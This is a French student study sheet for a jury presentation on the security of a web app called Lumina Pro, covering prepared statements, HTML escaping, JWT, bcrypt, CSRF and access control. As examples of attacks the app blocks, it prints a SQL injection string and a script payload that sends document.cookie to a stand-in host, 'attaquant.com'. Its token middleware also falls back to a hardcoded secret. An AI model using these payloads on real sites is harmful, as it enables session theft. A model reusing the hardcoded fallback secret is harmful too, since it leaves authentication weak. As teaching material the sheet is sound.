# FICHE SÉCURITÉ DÉTAILLÉE — LUMINA PRO
## À réciter face au jury

---

## 1. INJECTIONS SQL — Protection dans Lumina

### Comment ça marche ?

Toutes les requêtes SQL dans Lumina utilisent des **requêtes préparées** (prepared statements) :

```js
// routes/auth.js — Exemple concret
const sql = "SELECT * FROM users WHERE email = ?";
req.db.query(sql, [email], (err, results) => { ... });
```

Le `?` est un **placeholder**. Le driver `mysql2` échappe automatiquement la valeur.

### Sans protection (VULNÉRABLE) :

```js
// NE PAS FAIRE
const sql = `SELECT * FROM users WHERE email = '${email}'`;
```

Si l'attaquant saisit `admin@lumina.com' OR '1'='1' --` :
```sql
-- La requête devient :
SELECT * FROM users WHERE email = 'admin@lumina.com' OR '1'='1' --'
-- Résultat : retourne TOUS les utilisateurs → accès non autorisé
```

### Avec protection (LUMINA) :

Le driver passe la valeur comme données, pas comme code SQL.
L'apostrophe est échappée → `admin@lumina.com\' OR \'1\'=\'1\' --` → chaîne littérale inoffensive.

---

## 2. XSS (Cross-Site Scripting) — `escapeHTML()` dans Lumina

### Où est défini `escapeHTML()` ?

```js
// frontend/js/api.js
function escapeHTML(str) {
    if (!str) return '';
    return str.toString()
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#39;");
}
```

### Pourquoi chaque remplacement ?

| Caractère | Entité HTML | Risque si non échappé |
|-----------|-------------|----------------------|
| `&` | `&amp;` | Début d'entité malformée |
| `<` | `&lt;` | Balise HTML/Script ouvrante |
| `>` | `&gt;` | Balise HTML/Script fermante |
| `"` | `&quot;` | Ferme un attribut HTML |
| `'` | `&#39;` | Ferme un attribut HTML simple |

### Exemple d'attaque XSS bloquée :

```
Titre de tâche malveillant :
<script>document.location='http://attaquant.com?c='+document.cookie</script>
```

**Sans** `escapeHTML()` → ce script s'exécute dans le navigateur de tous les visiteurs → vol de tokens localStorage.

**Avec** `escapeHTML()` → le titre affiché est :
```
&lt;script&gt;document.location='http://attaquant.com?c='+document.cookie&lt;/script&gt;
```
Le navigateur l'affiche comme texte inoffensif.

---

## 3. JWT — Authentification sans état

### Structure d'un JWT :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9    ← Header (Base64URL)
.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjE2MjM5MDIyfQ  ← Payload
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature (HMAC-SHA256)
```

**Header décodé :** `{ "alg": "HS256", "typ": "JWT" }`
**Payload décodé :** `{ "id": 1, "role": "admin", "iat": 1616239022, "exp": 1616325422 }`

### Comment `verifyToken` fonctionne ligne par ligne :

```js
// backend/middleware/security.js
function verifyToken(req, res, next) {
    // 1. Récupérer le header Authorization
    const authHeader = req.headers['authorization'];
    
    // 2. Vérifier qu'il existe et commence par "Bearer "
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Token manquant' });
    }
    
    // 3. Extraire le token (tout après "Bearer ")
    const token = authHeader.split(' ')[1];
    
    // 4. Vérifier la signature et l'expiration
    try {
        const decoded = jwt.verify(token, process.env.SECRET_KEY || 'lumina_secret');
        req.user = decoded;  // { id: 1, role: "admin", iat: ..., exp: ... }
        next();              // Passer à la route suivante
    } catch (err) {
        return res.status(403).json({ error: 'Token invalide ou expiré' });
    }
}
```

### Pourquoi 401 vs 403 ?

- **401 Unauthorized** : "Je ne sais pas qui vous êtes" → token absent
- **403 Forbidden** : "Je sais qui vous êtes mais vous n'avez pas le droit" → token expiré/falsifié

---

## 4. BCRYPT — Hachage des mots de passe

### Processus complet à l'inscription :

```js
// backend/routes/auth.js — Register
const hashedPassword = await bcrypt.hash(password, 10);
// password = "MonMotDePasse!"
// 10 = cost factor (2^10 = 1024 itérations de l'algorithme Blowfish)
// hashedPassword = "$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LPVhrNpFVK"
// Structure : $<version>$<cost>$<22 chars sel><31 chars hash>
```

### Processus complet à la connexion :

```js
// backend/routes/auth.js — Login
const match = await bcrypt.compare(password, user.password);
// 1. Extrait les 22 premiers chars du hash = le sel
// 2. Re-hache password avec ce sel et 10 rounds
// 3. Compare les résultats → match = true ou false
```

### Pourquoi c'est sûr ?

| Algorithme | Vitesse | Temps pour 1 milliard de tentatives |
|------------|---------|--------------------------------------|
| MD5 | Ultra rapide | Quelques secondes |
| SHA-256 | Rapide | Quelques minutes |
| bcrypt (10) | Lent intentionnel | Plusieurs années |

### Différence hachage vs chiffrement :

| | Hachage (bcrypt) | Chiffrement (AES) |
|---|---|---|
| Réversible | NON | OUI (avec clé) |
| Usage | Mots de passe | Données à transmettre |
| Exemple | `$2b$10$...` | données chiffrées |
| Décryptable | Impossible | Oui avec la clé |

---

## 5. CSRF — Pourquoi Lumina est protégé

### Qu'est-ce que CSRF ?

Un site malveillant `pirate.com` peut forcer votre navigateur à envoyer des requêtes vers Lumina à votre insu.

### Pourquoi Lumina résiste (partiellement) :

Lumina stocke le JWT dans `localStorage`, pas dans un cookie.

- Les cookies sont **automatiquement** envoyés par le navigateur sur toutes les requêtes → vulnérable CSRF
- `localStorage` n'est **jamais** envoyé automatiquement → le code `authFetch()` doit explicitement lire et ajouter le token
- Un script cross-origin **ne peut pas lire** le `localStorage` d'un autre domaine (Same-Origin Policy)
- Les requêtes cross-origin **ne peuvent pas** ajouter des headers `Authorization` custom

**Résultat :** `pirate.com` ne peut ni lire le token ni l'envoyer → les requêtes forgées n'ont pas de JWT → rejetées par `verifyToken`.

### Limitation :

Cette protection fonctionne seulement si le site ne subit pas de XSS. Si un XSS réussit (ex: `escapeHTML` bypassé), un script peut lire `localStorage` et voler le token.

---

## 6. CONTRÔLE D'ACCÈS — Gestion des rôles

### Implémentation côté client (affichage) :

```js
// frontend/js/kanban.js
const user = JSON.parse(localStorage.getItem('user'));
if (user.role === 'admin') {
    document.getElementById('equipe-menu').style.display = 'flex';
}
```

**Important :** C'est une sécurité d'affichage uniquement, pas une vraie sécurité.

### Ce qui manquerait en production :

```js
// À ajouter dans backend/routes/users.js
router.get('/', verifyToken, (req, res) => {
    // Vérification côté serveur du rôle
    if (req.user.role !== 'admin') {
        return res.status(403).json({ error: 'Réservé aux administrateurs' });
    }
    // ... reste du code
});
```

---

## 7. PROTECTION EN COUCHES (Defense in Depth)

Lumina implémente plusieurs couches de sécurité :

```
Couche 1 : Client
└─ escapeHTML() → XSS
└─ authFetch() → Toujours authentifié
└─ e.preventDefault() → Pas de soumission non contrôlée

Couche 2 : Transport
└─ HTTPS (en production) → Chiffrement transit
└─ CORS configuré → Origines contrôlées

Couche 3 : Serveur
└─ verifyToken middleware → Authentification
└─ Requêtes préparées → SQL Injection

Couche 4 : Base de données
└─ bcrypt → Mots de passe hashés
└─ FOREIGN KEYS → Intégrité données
└─ ENUM → Valeurs contrôlées
└─ NOT NULL → Données obligatoires
```

---

## 8. CE QUI MANQUE EN PRODUCTION

Points à mentionner proactivement face au jury :

1. **`.env` pour `SECRET_KEY`** → actuellement hardcodé dans `server.js`
2. **HTTPS** → actuellement HTTP en dev local
3. **Rate limiting** → pas de protection contre le bruteforce de login
4. **Vérification du rôle côté serveur** pour `/api/users` et `/api/columns`
5. **Validation côté serveur** → titre/email vides non validés en backend
6. **Révocation de JWT** → déconnexion ne révoque pas le token
7. **Logs de sécurité** → les logs actuels tracent les actions mais pas les tentatives échouées
8. **CSRF tokens** → si on passait aux cookies, il faudrait des tokens CSRF

---

## 9. TABLEAU RÉCAPITULATIF — ATTAQUES VS PROTECTION

| Attaque | Description | Protection dans Lumina |
|---------|-------------|------------------------|
| SQL Injection | Code SQL dans formulaires | Requêtes préparées (`?`) |
| XSS réfléchi | Script dans URL | `escapeHTML()` |
| XSS stocké | Script en BDD | `escapeHTML()` à l'affichage |
| CSRF | Requête forgée cross-site | JWT dans header (non cookie) |
| Brute force mots de passe | Essai massif | bcrypt (lent) |
| Élévation de privilèges | Modifier son rôle | JWT signé (non falsifiable) |
| Session hijacking | Vol de cookie | Pas de cookies, localStorage |
| Injection de commande | CMD dans champs | Non applicable (pas d'exec shell) |
